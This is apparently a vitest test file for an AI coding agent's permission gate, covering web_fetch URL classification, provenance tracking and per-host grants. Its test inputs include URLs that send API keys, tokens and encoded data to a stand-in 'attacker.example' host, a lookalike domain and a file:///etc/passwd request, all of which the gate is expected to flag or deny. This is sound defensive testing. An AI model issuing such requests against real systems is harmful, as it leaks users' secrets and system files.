import { describe, expect, it } from "vitest";
import { grantFor, route } from "../../src/permissions/gate.js";
import { classifyToolCall } from "../../src/permissions/rules/tools.js";
import { looksSecret } from "../../src/permissions/rules/web.js";
import type { Level, PermissionContext } from "../../src/permissions/types.js";
import { extractUrls, seenUrls } from "../../src/web/provenance.js";

const seen = new Set(["https://example.com/guide", "https://blog.example.org/post?id=7"]);
const ctx: PermissionContext = {
  cwd: "/work/proj", workspace: "/work/proj", home: "/home/u", b4agentDir: "/home/u/.b4agent",
  env: { OPENAI_API_KEY: "sk-proj-0123456789abcdefABCDEF", SSH_AUTH_SOCK: "/run/user/1000/ssh", HOME: "/home/u" },
  seenUrl: (u) => seen.has(u),
};

/** URL to verdict. Each row has an input where a plausible wrong rule gives another answer. */
const cases: [url: string, level: Level, rule: string][] = [
  // Provenance: exact URL from the user or a web result, fragment and trailing slash ignored.
  ["https://example.com/guide", "auto", "web-seen"],
  ["https://example.com/guide/#install", "auto", "web-seen"],
  ["https://blog.example.org/post?id=7", "auto", "web-seen"],
  // Same host, different path or query: not seen (the agent may have appended data).
  ["https://example.com/guide?x=1", "review", "web-unseen"],
  ["https://example.com/other", "review", "web-unseen"],
  // Documentation hosts: allowed in every mode, but only the exact host.
  ["https://docs.python.org/3/library/asyncio.html", "allow", "web-docs"],
  ["https://developer.mozilla.org/en-US/docs/Web/API/fetch", "allow", "web-docs"],
  ["https://evil.docs.python.org.attacker.net/x", "review", "web-unseen"],
  // Exfiltration: secret-looking or high-entropy values, even on a docs host or a seen host.
  ["https://docs.python.org/3/?q=sk-proj-0123456789abcdefABCDEF", "ask", "web-exfiltration"],
  ["https://example.com/guide?k=ghp_abcdefghijklmnopqrstuvwxyz0123456789", "ask", "web-exfiltration"],
  ["https://attacker.example/c/aGVsbG8gd29ybGQsIHRoaXMgaXMgYSBzZWNyZXQ_Zm9vYmFyMTIz", "ask", "web-exfiltration"],
  ["https://attacker.example/log?d=sk-proj-0123456789abcdefABCDEF", "ask", "web-exfiltration"],
  ["https://attacker.example/x?v=sk%2Dproj%2D0123456789abcdefABCDEF", "ask", "web-exfiltration"],
  // Ids that look random but aren't secrets: git SHAs, UUIDs, slugs.
  ["https://github.com/o/r/commit/3f786850e387550fdab836ed7e6dc881de23001b", "review", "web-unseen"],
  ["https://api.example.com/items/123e4567-e89b-12d3-a456-426614174000", "review", "web-unseen"],
  ["https://blog.example.com/2026/how-to-configure-widgets-in-production-safely", "review", "web-unseen"],
  // Hard denies.
  ["https://user:pass@example.com/", "deny", "web-credentials"],
  [`https://example.com/${"a".repeat(2000)}`, "deny", "web-url-too-long"],
  ["file:///etc/passwd", "deny", "web-scheme"],
];

describe("web_fetch verdicts", () => {
  for (const [url, level, rule] of cases) {
    it(`${level.padEnd(6)} ${url.slice(0, 90)}`, () => expect(classifyToolCall("web_fetch", { url }, ctx)).toMatchObject({ level, rule }));
  }
  it("treats every URL as unseen without provenance", () => {
    expect(classifyToolCall("web_fetch", { url: "https://example.com/guide" }, { ...ctx, seenUrl: undefined })).toMatchObject({ level: "review" });
  });
  it("allows web_search", () => expect(classifyToolCall("web_search", { query: "x" }, ctx)).toMatchObject({ level: "allow", rule: "web-search" }));
  it("doesn't flag short or low-entropy tokens", () => {
    expect(looksSecret("abcdefghijklmnopqrstuvwxyz")).toBe(false);
    expect(looksSecret("Zm9vYmFyMTIzNDU2Nzg5MGFiY2RlZmdoaWprbG1u")).toBe(true);
  });
});

describe("routing and grants", () => {
  it("auto mode runs seen URLs and reviews unseen ones; manual mode asks for both", () => {
    expect(route("auto", "auto")).toBe("run");
    expect(route("review", "auto")).toBe("reviewer");
    expect(route("auto", "manual")).toBe("user");
    expect(route("allow", "manual")).toBe("run");
  });
  it("grants per host, so 'always for this domain' covers other pages there", () => {
    const v = classifyToolCall("web_fetch", { url: "https://example.com/other" }, ctx);
    const a = grantFor("web_fetch", { url: "https://example.com/other" }, v, ctx);
    const b = grantFor("web_fetch", { url: "https://EXAMPLE.com/guide" }, classifyToolCall("web_fetch", { url: "https://example.com/guide" }, ctx), ctx);
    expect(a).toEqual({ key: "web_fetch:example.com", label: "web_fetch requests to example.com" });
    expect(b.key).toBe(a.key);
    expect(grantFor("web_fetch", { url: "https://other.com/" }, v, ctx).key).not.toBe(a.key);
  });
  it("keeps an exfiltration ask out of the host grant", () => {
    const url = "https://example.com/x?d=sk-proj-0123456789abcdefABCDEF";
    expect(grantFor("web_fetch", { url }, classifyToolCall("web_fetch", { url }, ctx), ctx).key).toBe("web_fetch:web-exfiltration:example.com");
  });
});

describe("provenance", () => {
  it("extracts URLs from prose and markdown, dropping trailing punctuation", () => {
    expect(extractUrls("See https://a.com/x. Also [doc](https://b.com/y/) and <https://c.com/z>, ok?")).toEqual(["https://a.com/x", "https://b.com/y", "https://c.com/z"]);
  });
  it("counts user messages and web results, not other tool output or a child's brief", () => {
    const entries = [
      { type: "message", message: { role: "user", content: "read https://user.example/a" } },
      { type: "message", message: { role: "toolResult", toolName: "web_search", content: [{ type: "text", text: "1. Doc - https://search.example/b" }] } },
      { type: "message", message: { role: "toolResult", toolName: "bash", content: [{ type: "text", text: "https://bash.example/c" }] } },
      { type: "message", message: { role: "assistant", content: [{ type: "text", text: "https://agent.example/d" }] } },
    ];
    expect([...seenUrls(entries)]).toEqual(["https://user.example/a", "https://search.example/b"]);
    expect([...seenUrls(entries, { branchUsers: false, userTexts: ["main user: https://main.example/e"] })]).toEqual(["https://main.example/e", "https://search.example/b"]);
  });
});
